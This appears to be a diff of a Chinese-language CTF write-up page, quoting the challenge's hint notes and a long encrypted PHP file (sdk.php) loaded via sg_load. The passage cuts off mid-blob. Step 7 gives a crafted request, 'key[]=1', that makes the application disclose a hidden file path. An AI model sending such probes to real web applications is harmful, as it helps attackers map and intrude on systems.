-    1.&#x6B64;&#x5904;&#x51FD;&#x6570;return&#x503C;&#x5E76;&#x4E0D;&#x662F;&#x771F;&#x6B63;&#x7684;flag&#xFF0C;&#x548C;&#x771F;&#x6B63;&#x7684;flag&#x6CA1;&#x6709;&#x5173;&#x7CFB;&#x3002;
-    2.&#x6B64;&#x5904;&#x8C03;&#x7528;&#x7684;sha1&#x51FD;&#x6570;&#x4E3A;PHP&#x8BED;&#x8A00;&#x5185;&#x5EFA;&#x7684;hash&#x51FD;&#x6570;&#x3002;(http://php.net/manual/zh/function.sha1.php)
-    3.&#x60A8;&#x65E0;&#x987B;&#x5C1D;&#x8BD5;&#x672C;&#x5730;&#x89E3;&#x7801;&#x6216;&#x672C;&#x5730;&#x8FD0;&#x884C;sdk.php&#xFF0C;&#x5B83;&#x88AB;&#x9884;&#x671F;&#x5728;&#x6307;&#x5B9A;&#x670D;&#x52A1;&#x5668;&#x73AF;&#x5883;&#x4E0A;&#x8FD0;&#x884C;&#x3002;
-    4.&#x51E0;&#x4E4E;&#x5927;&#x90E8;&#x5206;&#x6E90;&#x7801;&#x5185;&#x90FD;&#x6709;&#x4E00;&#x5B9A;&#x7684;hint&#xFF0C;&#x5982;&#x679C;&#x60A8;&#x662F;&#x901A;&#x8FC7;&#x626B;&#x63CF;&#x76EE;&#x5F55;&#x53D1;&#x73B0;&#x672C;&#x6587;&#x4EF6;&#x7684;&#xFF0C;&#x60A8;&#x53EF;&#x80FD;&#x8FD8;&#x6709;&#x5F88;&#x957F;&#x7684;&#x8DEF;&#x8981;&#x8D70;&#x3002;
+    PS: &#x4E3A;&#x4E86;&#x8282;&#x7701;&#x5404;&#x4F4D;&#x5927;&#x4F6C;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x7279;&#x6CE8;&#x660E;
+        1.&#x6B64;&#x5904;&#x51FD;&#x6570;return&#x503C;&#x5E76;&#x4E0D;&#x662F;&#x771F;&#x6B63;&#x7684;flag&#xFF0C;&#x548C;&#x771F;&#x6B63;&#x7684;flag&#x6CA1;&#x6709;&#x5173;&#x7CFB;&#x3002;
+        2.&#x6B64;&#x5904;&#x8C03;&#x7528;&#x7684;sha1&#x51FD;&#x6570;&#x4E3A;PHP&#x8BED;&#x8A00;&#x5185;&#x5EFA;&#x7684;hash&#x51FD;&#x6570;&#x3002;(http://php.net/manual/zh/function.sha1.php)
+        3.&#x60A8;&#x65E0;&#x987B;&#x5C1D;&#x8BD5;&#x672C;&#x5730;&#x89E3;&#x7801;&#x6216;&#x672C;&#x5730;&#x8FD0;&#x884C;sdk.php&#xFF0C;&#x5B83;&#x88AB;&#x9884;&#x671F;&#x5728;&#x6307;&#x5B9A;&#x670D;&#x52A1;&#x5668;&#x73AF;&#x5883;&#x4E0A;&#x8FD0;&#x884C;&#x3002;
+        4.&#x51E0;&#x4E4E;&#x5927;&#x90E8;&#x5206;&#x6E90;&#x7801;&#x5185;&#x90FD;&#x6709;&#x4E00;&#x5B9A;&#x7684;hint&#xFF0C;&#x5982;&#x679C;&#x60A8;&#x662F;&#x901A;&#x8FC7;&#x626B;&#x63CF;&#x76EE;&#x5F55;&#x53D1;&#x73B0;&#x672C;&#x6587;&#x4EF6;&#x7684;&#xFF0C;&#x60A8;&#x53EF;&#x80FD;&#x8FD8;&#x6709;&#x5F88;&#x957F;&#x7684;&#x8DEF;&#x8981;&#x8D70;&#x3002;
 </code></pre><p>7&#x3001;&#x7136;&#x540E;&#x6765;&#x8BD5;&#x8BD5; flag &#x8FD9;&#x91CC;&#xFF0C;&#x8BBF;&#x95EE; /?route=app/flag&amp;key[]=1&#xFF0C;&#x7206;&#x51FA;&#x4E00;&#x4E2A; /ctf/sdk.php&#x3002;</p>
 <p><img src="https://www.zhaoj.in/wp-content/uploads/2019/04/1555861516bbeb3b61ab497633d6ae926e98b3b869-1024x226.png" alt=""></p>
 <p>8&#x3001;&#x6765;&#x8BFB;&#x53D6;&#x4E00;&#x4E0B; /ctf/sdk.php &#x6E90;&#x7801;&#x8BD5;&#x8BD5;&#x3002;</p>
 <p>/ctf/sdk.php &#x6E90;&#x7801;&#xFF1A;</p>
-<pre class="language-"><code><span class="token prolog">&lt;?php ?&gt;</span>&lt;?php //CN: &#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x4F7F;&#x7528;&#x5546;&#x4E1A;&#x4EE3;&#x7801;&#x4FDD;&#x62A4;&#x5DE5;&#x5177;&#x52A0;&#x5BC6;&#x7684;PHP&#x6587;&#x4EF6;&#xFF0C;&#x4F60;&#x5E76;&#x4E0D;&#x9700;&#x8981;&#x89E3;&#x5BC6;&#x5B83;&#x3002;EN: Advanced encrypted PHP File, You do not need to decrypt it.&lt;?php
-return sg_load(&apos;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&apos;);
+<pre class="language-"><code>    <span class="token prolog">&lt;?php ?&gt;</span>&lt;?php //CN: &#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x4F7F;&#x7528;&#x5546;&#x4E1A;&#x4EE3;&#x7801;&#x4FDD;&#x62A4;&#x5DE5;&#x5177;&#x52A0;&#x5BC6;&#x7684;PHP&#x6587;&#x4EF6;&#xFF0C;&#x4F60;&#x5E76;&#x4E0D;&#x9700;&#x8981;&#x89E3;&#x5BC6;&#x5B83;&#x3002;EN: Advanced encrypted PHP File, You do not need to decrypt it.&lt;?php
+    return sg_load(&apos;A99ED844A249E2CBAAQAAAAXAAAABGgAAACABAAAAAAAAAD/NITKImzCGI1VR9EIK9uHVUsgvUtMu+SENdmCS1ehX392cUgf5knUyGDxCMj325X7iibxp53EThwzrN/ra9pQEbnXqWWG47SMgMgHSk554rg4E2sxNtl859bWR1SmD7rN2VsgRFl8TTsHAAAAaBAAABfUjHZ7qKwZz4WpMv67AmIzcNoHPMwtJpzi5QgwafCHBbDTvg9VK0uFZGSaIiJ8fTw0lIysz/pdGfajfJZVuS8v4mbmeEulHwIvUqwxHbrxgyu7chgH4h8DGTsolnBj/060yIs5jE49hrcLOLGwYy4BXgsYxuDVG3kXw2U4mjwdk9HoJwy3sTtcQR0oriXaIuEqSmW4GvMeSNxaVcgczCieXoz3VhPx4waUW2YkWfIQLtGiyaCHJiWU8QsUkMWSsjIGDJBbMqHsLIGLwi8KhXemujfi9lcf/hmI4dL8yEfU7WVyVOGefTAqEuJeSJD8cxput1XanBRkTZyCuxVIq0bXjM60X3PFSYFNJ0D6uLkLlK5Z6MalJrgre4wU0eTunFrRoDCJ/wCUDKdcLYHZyaG9LtVTh+OA/3Ap2JEOL31MuZXx+PbY8QT6a1BkmgzhuIHq2D/5wX6Pw1sK8iTjNxjelvkIyLJLWADjHvSCpyxvFLohfsl2TnhpwZtsVsJK/SucocY5g0UjC3n+9mveP65BddLhazeUHopQgmbsvxXUnN9yTKZb9/GQF/RctqADsj/+VbsYeL/jHd1fjQlmH6gpAkBmyDS4o/0TFCGYMGewiFJVuo4u1g6G2ydBtjPUx3mwS/C+/x2VefDP0p5WORQa684LDuVW/21crRxybsSWpbO4A0plcs8q20GEZjEZlPcyqI0MnOBfCPhRLJMzl16YorHA97yNZuU2lXX7PxsBS3QTepAr2YGU/8Mw9p75//Gdt95+h8HgpZVDmwl8AEfqaB46EGc1R4JYtzYCxtjv594oN2rD9BEIGWhdevyeCrjQosate2zZhM7pbxSzxsNZ1NG5SmYHYgA+VQBn0FiL/wsEEO4IS/LWXYL5PL3JQlpcAoMeBZj5ImViHKvDPW8uiUs7Mr/bOH+ildgnKHddncvKbyvzzn/dvy5cmu1RJDVj5VLqsu+EyQ94rOUvbqDZS7qm3B1D7DaUbi3IQjRUkcqv2A2UBnqXNlNxqXQxrHlJ10k+cLZsHbRELd6UoLROCBqj7yyhibeVuZrEIJ6hFWRgSDqyI2SGkuDVfeOMfrBLGBKrGU5PhVC+gpiznnuCqvbWQK29fp6UffvQ75yUPC4Bk9VAWx0RUrSRzgdV1AnU4J136CF8Xy0ubxCHr+4rf/WE2HrxHErJrObdchl2gA6arFvk6OmT7tXUyKm1AvVl57RI26dzq0Gyz38fG/sloVi0eqUzEqpVQPGdY48t+F5I32w3BUPNfYUHOUhiRx0H0i61SWS8gGGOXkK8DmrsUwPoZGeT+F0yor8/aIMklELuwhyKacnHLXgo